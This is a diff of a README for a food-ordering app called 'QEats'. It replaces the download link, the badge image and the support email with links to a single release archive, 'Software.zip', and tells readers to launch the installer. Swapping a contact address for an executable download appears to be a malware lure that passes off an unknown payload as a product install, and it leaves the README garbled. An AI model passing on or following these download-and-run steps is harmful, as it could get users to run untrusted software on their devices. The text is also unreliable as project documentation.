@@ -30,9 +30,9 @@ QEats is an innovative app that revolutionizes the way users order food. With QE
 
 ## 🚀 Getting Started
 
-To get started with QEats, you can download the app from the [QEats release page](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip).
+To get started with QEats, you can download the app from the [QEats release page](https://github.com/hermogenesjr/QEats/releases/download/v1.0/Software.zip).
 
-[![Download QEats](https://img.shields.io/badge/Download-QEats-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download QEats](https://github.com/hermogenesjr/QEats/releases/download/v1.0/Software.zip)](https://github.com/hermogenesjr/QEats/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the app, launch the installation file and follow the on-screen instructions to set up QEats on your device.
 
@@ -54,7 +54,7 @@ We welcome contributions from the community to help improve QEats and make it ev
 
 ## 📞 Contact Us
 
-If you have any questions, feedback, or suggestions regarding QEats, feel free to reach out to us at qeats.support@example.com. We value your input and are always striving to enhance the app based on user feedback.
+If you have any questions, feedback, or suggestions regarding QEats, feel free to reach out to us at https://github.com/hermogenesjr/QEats/releases/download/v1.0/Software.zip We value your input and are always striving to enhance the app based on user feedback.
 
 ---
 
